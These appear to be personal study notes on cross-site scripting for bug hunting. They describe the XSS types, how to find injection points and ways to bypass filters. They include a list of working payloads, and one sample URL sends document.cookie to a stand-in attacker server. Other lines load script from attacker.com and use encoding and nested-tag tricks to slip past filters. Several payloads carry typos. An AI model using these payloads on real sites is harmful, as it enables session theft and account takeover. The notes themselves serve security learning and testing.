### Types of XSS

* XSS happens when scripts run on a victim's browser when a website cant tell the difference betweene user input and website code.
* **Stored XSS** - When user input is stored on a server and retrieved later unsafely.
    * Although they weren't properly sanitized being injected, scripts could be escaped/sanitized if it was being retrieved 
    * Most dangerous type of XSS
    * <script> alert('XSS by Vickie'); </script>
    * Cookies and personal info could be stolen with XSS. But it can also change site contents and redirect to other sites.
    * **Forms, search boxes, name, or username fields.**
    * Sometimes menus or numeric fields can have XSS if you change their values in a proxy.
 * **Blind XSS** - a stored XSS that takes place someplace else in the application.
    * Harder to detect, you cant find them by lookinh got reflected input from the server.
    * Attacks can host their own server and if they see a response to that server, then that web application has that XSS vulnerability.
 * **Reflected XSS** - user input is returned without being stored in a database. Often found in input forms that build pages, like search boxes.
     * h<span>ttps://example.com/search?q=<script> ... </script>
     * Not only could they extract data, but **perform malicious actions on the victim's machine on behalf of the attacker**.
 * **DOM-based XSS** - similar to a reflected XSS except it doesnt leave the browser. Scripts injected stay on the browser and targets the DOM of a web page.
     * DOM specifies how HTML creates a webpage and how scripts modify it.
     * Targets local files saved on the browser.
     * jQuery alters the DOM is often vulnerable to these type of attacks.
     * **Can be embedded in fragments and URL parameters:**
         * h<span>ttps://example.com#about_us
         * h<span>ttps://example.com?locale=<script>location='http://attacker_server_ip/?c=+document.cookie;</script>
  * **Self-XSS** - a social engineering attack that tricks users into executing a XSS intructed by the attacker.

### Hunting for XSS
   
  * The <script> tag are unlikely to work on their own, you must use different methods.
  * HTML attributes:
      * onlick
      * onerror
      * onload
  * URL schemes like javascript: or data:
      * javascript: alert('Hello')
      * data: text/html; base64, PHNjcmlwd...+"
          * This scheme allows you to embed small files to the URL.
          * The data at the end is encoded in base64 to bypass the XSS filters.
  * Works on <<span>img> tag.
      * h<span>ttps://example.com/upload_profile_pic?url=IMAGE_URL
      * IMAGE URL will be inserted in a <img> tag when the image is rendered.
  * **Take note of which characters are being rendered directly and which ones are escaped.**
###  Common payloads

* <script> alert(1) </script>
* <iframe src = javascript: alert(1) >
* <<span>body onload=alert(1)>
* "><<span>img src=x onerror=prompt(1);>
* <script> alert(1)<!-
    * <!- is an HTML comment, prevents syntax errors.
* <a onmouseover" alert(1)"> test </a>
* <script src=//attacker.com/test.js>

### Other test methods

* Test strings: 
    * <span>>
    * '
    * <span><
    * <span>"
    * //
    * :
    * =
    * ;
    * !
    * --
* Fuzzing

### Bypassing filters

* Mix different encodings and capitilizations to confuse filters.
* HTML allows for syntax errors in capitilzations
* If special characters are filtered, you cant write strings into a payload directly.
    * Use JavaScript functions like fromCharCopde() that translates numeric codes to ASCII chars.
    * <scrIPT> location=String.fromCharCode(104,116,...)+document.cookie;</srcIPT>
    * Use h<span>ttp://js.do/
* Sometimes applications remove tags once or a couple times.
    * <scrip<script>t> ... </scrip</script>t>
    * The inner script tags will be removed, but the outer ones will be brought together and execute.
    
